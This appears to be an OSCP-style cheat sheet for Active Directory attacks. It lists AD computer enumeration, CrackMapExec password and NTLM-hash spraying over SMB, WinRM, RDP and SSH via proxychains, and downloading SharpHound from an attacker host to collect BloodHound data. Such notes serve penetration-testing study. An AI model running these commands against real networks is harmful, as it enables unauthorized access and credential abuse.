
# List all currently joined machines in the AD
```bash
Get-ADComputer -Filter * -Properties Name -Server "oscp.exam"
Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem, OperatingSystemServicePack | Format-List name, ipv4*, oper*
```

-----------------------
# CrackMapExec

Enumerate smb, winrm, rdp, and ssh through CrackMapExec with passwords and hashes
```bash
proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD --continue-on-success 
proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD

proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
```

-----------------------
# SharpHound & BloodHound

Transfer SharpHound into the remote machine, collect data, and
transfer data back to the attacker machine
```bash
iwr -uri http://192.168.45.159:1337/SharpHound.exe -Outfile SharpHound.exe
./SharpHound.exe --CollectionMethods All
```

Start neo4j. Default creds are `neo4j:admin`
```bash
sudo /usr/bin/neo4j console
http://localhost:7474/browser/
```

Launch BloodHound
```bash
./BloodHound --no-sandbox
```

